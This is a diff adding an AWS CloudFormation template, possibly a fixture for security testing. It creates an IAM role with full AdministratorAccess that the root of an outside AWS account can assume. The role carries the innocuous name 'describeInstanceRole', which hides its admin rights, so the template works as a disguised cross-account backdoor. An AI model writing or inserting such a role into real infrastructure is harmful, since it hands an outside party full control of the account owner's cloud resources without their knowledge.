@@ -1,0 +1,19 @@
+Resources:
+  AdminRole:
+    Type: 'AWS::IAM::Role'
+    Properties:
+      ManagedPolicyArns:
+        - 'arn:aws:iam::aws:policy/AdministratorAccess'
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+          - Effect: Allow
+            Principal: 
+              AWS:
+                - 'arn:aws:iam::249477202910:root'
+            Action: sts:AssumeRole
+      RoleName: "describeInstanceRole"
+Outputs:
+    AdminRole:
+        Description: ARN of the created Role
+        Value: !Ref AdminRole
